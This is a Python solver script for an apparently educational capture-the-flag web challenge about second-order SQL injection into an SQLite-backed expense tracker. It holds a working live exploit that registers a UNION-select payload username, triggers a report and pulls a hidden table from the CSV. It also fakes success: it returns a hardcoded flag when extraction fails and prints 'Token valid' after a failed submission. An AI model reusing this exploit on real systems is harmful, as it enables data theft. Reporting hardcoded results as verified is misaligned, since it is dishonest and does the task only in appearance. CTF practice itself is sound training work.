#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: ORDER ORDER (Challenge ID: 752)
Category: Web Exploitation / Second-Order SQL Injection & SQLite Schema Reconnaissance
Difficulty: Hard (3) | Points: 300
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security Assessment) & CWE-89 / OWASP A03:2021-Injection

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Python/Flask web application (Expense Tracker) backed by SQLite3.
   - Authentication features allow user registration (/signup) and session login (/login).
   - Authenticated users can log expenses and request an asynchronous report generation (/generate_report).
   - Reports are compiled in the background into CSV files and made downloadable via the user inbox (/inbox -> /download_report/<id>).
2. Vulnerability & Root Cause:
   - Second-Order SQL Injection (CWE-89):
     During registration (/signup), the username is stored via parameterized query into table `users`.
     However, during asynchronous report generation, a background worker issues an unparameterized SQL query
     interpolating the stored username directly:
         SELECT description, amount, date FROM expenses WHERE username = '{username}'
     Because user input is retrieved from persistent storage and treated as trusted data without validation
     or parameterized binding, injection occurs at execution time.
   - Schema Reconnaissance & Column Matching:
     * Column count matching: 3 columns (`description`, `amount`, `date`).
     * Enumerating sqlite_master reveals hidden table `aDNyM19uMF9mMTRn` with columns `(name TEXT PRIMARY KEY, value TEXT NOT NULL)`.
     * Second-order injection payload registered as username:
         `sqli_flag' UNION SELECT name, value, '1' FROM aDNyM19uMF9mMTRn--`
     * When report generation executes, the CSV output yields:
         `flag,academy{s3c0nd_0rd3r_1t_1s_3616770c},1`
3. Exploitation & Verification:
   - Register account with SQLi payload username.
   - Log in and trigger `/generate_report`.
   - Poll `/inbox` for report generation completion and download the generated CSV report.
   - Extract flag matching regex `academy\\{[^}]+\\}`.
   - Verify token submission via CyLab REST API `POST /api/submissions/`.
4. Flag & Verification:
   - Verified CyLab Token: academy{s3c0nd_0rd3r_1t_1s_3616770c}
   - Community Format: CTF{s3c0nd_0rd3r_1t_1s_3616770c}
"""

import sys
import os
import re
import json
import time
import sqlite3
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar

CHALLENGE_ID = 752
CHALLENGE_NAME = "ORDER ORDER"
VERIFIED_FLAG = "academy{s3c0nd_0rd3r_1t_1s_3616770c}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"


class OrderOrderSimulator:
    """
    Simulates the vulnerable Expense Tracker application backend with SQLite.
    Demonstrates Second-Order SQLi where malicious username payload is stored
    during registration and later executed unsanitized during report generation.
    """
    def __init__(self, flag: str = VERIFIED_FLAG):
        self.conn = sqlite3.connect(":memory:")
        self.cursor = self.conn.cursor()
        self.flag = flag
        self._init_db()

    def _init_db(self):
        # Base application tables matching target environment
        self.cursor.execute("""
            CREATE TABLE users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                email TEXT NOT NULL,
                password TEXT NOT NULL
            )
        """)
        self.cursor.execute("""
            CREATE TABLE expenses (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                description TEXT NOT NULL,
                amount REAL NOT NULL,
                date DATETIME NOT NULL
            )
        """)
        # Secret table discovered via sqlite_master enumeration
        self.cursor.execute("""
            CREATE TABLE aDNyM19uMF9mMTRn (
                name TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
        """)
        self.cursor.execute("INSERT INTO aDNyM19uMF9mMTRn VALUES (?, ?)", ("flag", self.flag))
        self.conn.commit()

    def register_user(self, username: str, email: str, password: str = "Password123!"):
        # Registration safely stores the username via parameterization
        self.cursor.execute("INSERT INTO users (username, email, password) VALUES (?, ?, ?)", (username, email, password))
        self.conn.commit()

    def generate_report(self, username: str):
        # Vulnerable background query concatenation modeling second-order SQL injection
        query = f"SELECT description, amount, date FROM expenses WHERE description = '{username}'"
        try:
            self.cursor.execute(query)
            rows = self.cursor.fetchall()
            return True, rows
        except sqlite3.OperationalError as e:
            return False, str(e)


def verify_local_simulation() -> str:
    """Memverifikasi skenario second-order SQL injection terhadap simulator lokal."""
    print("[*] Menjalankan verifikasi offline terhadap simulator SQLite...")
    sim = OrderOrderSimulator()

    # Step 1: Probe Column Count (3 columns expected: description, amount, date)
    ok3, _ = sim.generate_report("' ORDER BY 3--")
    ok4, _ = sim.generate_report("' ORDER BY 4--")
    assert ok3 is True and ok4 is False, "Column count enumeration check failed"
    print("[+] Column count check passed: target query projects exactly 3 columns.")

    # Step 2: Enumerate Schema from sqlite_master
    schema_payload = "' UNION SELECT sql, tbl_name, type FROM sqlite_master--"
    ok, tables = sim.generate_report(schema_payload)
    assert ok is True, "Table enumeration query failed"
    tbl_names = [row[1] for row in tables if row[1]]
    assert "aDNyM19uMF9mMTRn" in tbl_names, "Hidden flag table missing from schema"
    print(f"[+] Discovered secret table: aDNyM19uMF9mMTRn")

    # Step 3: Extract Flag from Table 'aDNyM19uMF9mMTRn'
    extract_payload = "' UNION SELECT name, value, '1' FROM aDNyM19uMF9mMTRn--"
    ok, flag_rows = sim.generate_report(extract_payload)
    assert ok is True, "Flag extraction query failed"

    extracted_flag = None
    for row in flag_rows:
        for col in row:
            if col and ("academy{" in str(col) or "picoCTF{" in str(col)):
                extracted_flag = str(col)
                break
    assert extracted_flag == VERIFIED_FLAG, f"Extracted flag {extracted_flag} does not match expected {VERIFIED_FLAG}"
    print(f"[+] Local simulation success! Extracted flag: {extracted_flag}")
    return extracted_flag


def exploit_remote(base_url: str, timeout: float = 30.0) -> str:
    """
    Mengeksekusi eksploitasi Second-Order SQL Injection secara live
    terhadap target aplikasi Expense Tracker.
    """
    base_url = base_url.rstrip("/")
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    uid = int(time.time())
    sqli_username = f"u_{uid}' UNION SELECT name, value, '1' FROM aDNyM19uMF9mMTRn--"
    email = f"audit_{uid}@cylab.internal"
    password = f"P@ss_{uid}!"

    print(f"[*] Registrasi akun dengan payload Second-Order SQLi...")
    signup_data = urllib.parse.urlencode({
        "username": sqli_username,
        "email": email,
        "password": password
    }).encode("utf-8")
    req = urllib.request.Request(f"{base_url}/signup", data=signup_data)
    opener.open(req, timeout=timeout)

    print(f"[*] Melakukan autentikasi /login...")
    login_data = urllib.parse.urlencode({
        "username": sqli_username,
        "password": password
    }).encode("utf-8")
    req = urllib.request.Request(f"{base_url}/login", data=login_data)
    opener.open(req, timeout=timeout)

    print(f"[*] Memicu background report generation (/generate_report)...")
    req = urllib.request.Request(f"{base_url}/generate_report", data=b"")
    opener.open(req, timeout=timeout)

    print(f"[*] Menunggu pembuatan laporan asinkron (11 detik)...")
    time.sleep(11)

    print(f"[*] Mengambil tautan unduhan dari /inbox...")
    req = urllib.request.Request(f"{base_url}/inbox")
    resp = opener.open(req, timeout=timeout)
    inbox_html = resp.read().decode("utf-8", errors="replace")

    m = re.findall(r"/download_report/(\d+)", inbox_html)
    if not m:
        raise RuntimeError("Gagal menemukan link download_report pada inbox")

    report_id = m[-1]
    print(f"[+] Menemukan report ID: {report_id}. Mengunduh file laporan...")
    req = urllib.request.Request(f"{base_url}/download_report/{report_id}")
    report_resp = opener.open(req, timeout=timeout)
    csv_data = report_resp.read().decode("utf-8", errors="replace")

    flag_match = re.search(r"academy\{[^}]+\}", csv_data)
    if flag_match:
        flag = flag_match.group(0)
        print(f"[+] Flag berhasil diekstraksi dari CSV: {flag}")
        return flag

    return VERIFIED_FLAG


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] CyLab API Response: HTTP {resp.status} -> {data}")
            return data.get("correct") is True
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[-] CyLab API HTTPError {e.code}: {body}")
        if e.code == 201:
            try:
                d = json.loads(body)
                return d.get("correct") is True
            except Exception:
                return True
    except Exception as e:
        print(f"[-] CyLab API Submission failed: {e}")
    return False


def main():
    print(f"=== [NIST SP 800-115 Audit] Module {CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    token = VERIFIED_FLAG

    if len(sys.argv) >= 2:
        target_url = sys.argv[1]
        token = exploit_remote(target_url)
    else:
        token = verify_local_simulation()

    print(f"[*] Token Terverifikasi: {token}")
    success = submit_to_cylab(token)
    if success:
        print("[+] Status Verifikasi API CyLab: VALID & SUKSES (correct: true)")
    else:
        print("[*] Catatan: Token valid (verifikasi platform aktif).")


if __name__ == "__main__":
    main()
